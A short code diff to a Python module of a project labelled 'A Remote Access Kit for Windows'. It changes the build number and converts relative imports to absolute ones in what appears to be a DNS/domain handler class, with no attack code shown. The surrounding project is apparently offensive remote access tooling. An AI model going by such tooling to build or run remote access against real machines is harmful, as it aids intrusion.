@@ -10,13 +10,13 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 import requests
-from ..networking.IP_Handler import IPAddress
-from ..logging.logging import DNSconfigs,ConsoleWindow
-from ..utils.file_paths import CFGFilePath
-from ..utils.utils import Notifications,ErrorHandling
+from core.networking.utils.IP_Handler import IPAddress
+from core.logging.logging import DNSconfigs,ConsoleWindow
+from core.utils.file_paths import CFGFilePath
+from core.utils.utils import Notifications,ErrorHandling
 
 class DomainHandler():
 
